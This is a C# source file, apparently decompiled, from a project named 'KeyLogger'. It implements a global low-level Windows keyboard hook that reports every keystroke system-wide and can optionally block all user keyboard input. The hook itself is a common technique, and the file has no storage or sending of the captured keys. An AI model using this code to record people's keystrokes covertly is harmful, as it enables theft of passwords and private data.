using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Input;

namespace KeyLogger
{
    internal sealed class KeyboardHook : IDisposable
    {
        public KeyboardHook()
        {
            Initialize();
        }
        public bool LockAllKeys { get; set; }

        public event GlobalKeyPressedEventHandler GlobalKeyPressed;

        public void Dispose()
        {
            UnhookWindowsHookEx(_hookID);
            GC.KeepAlive(this.callback);
        }

        private LowLevelKeyboardProc callback;
        private IntPtr _hookID = IntPtr.Zero;
        private void Initialize()
        {
            this.callback = (int nCode, IntPtr wParam, IntPtr lParam) =>
            {
                HookStruct info = (HookStruct)Marshal.PtrToStructure(lParam, typeof(HookStruct));
                bool flag = nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN;
                if (flag)
                {
                    int vkCode = Marshal.ReadInt32(lParam);
                    GlobalKeyPressed?.Invoke(KeyInterop.KeyFromVirtualKey(vkCode));
                }
                if (LockAllKeys && info.flags != LLKHF_INJECTED)
                    return (IntPtr)1;
                else
                    return CallNextHookEx(_hookID, nCode, wParam, lParam);
            };
            _hookID = SetHook(this.callback);
        }

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (curProcess.MainModule)
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle("user32"), 0);
        }

        const int WH_KEYBOARD_LL = 13;
        const int WM_KEYDOWN = 256;
        const int LLKHF_INJECTED = 16;

        private struct HookStruct
        {
            // Token: 0x04000019 RID: 25
            public int vkCode;

            // Token: 0x0400001A RID: 26
            public int scanCode;

            // Token: 0x0400001B RID: 27
            public int flags;

            // Token: 0x0400001C RID: 28
            public int time;

            // Token: 0x0400001D RID: 29
            public int dwExtraInfo;
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        public delegate void GlobalKeyPressedEventHandler(Key key);

        #region API
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, KeyboardHook.LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        #endregion
    }
}
